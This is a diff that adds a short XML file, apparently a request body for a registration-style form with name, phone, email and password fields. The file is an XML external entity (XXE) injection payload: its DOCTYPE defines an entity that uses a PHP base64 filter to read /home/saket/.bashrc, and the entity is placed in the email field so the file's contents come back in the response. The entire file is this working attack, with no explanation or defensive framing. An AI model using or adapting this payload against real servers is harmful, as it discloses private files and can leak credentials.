@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">]>
+<root>
+<name></name><tel></tel>
+<email>&xxe;</email>
+<password></password>
+</root>
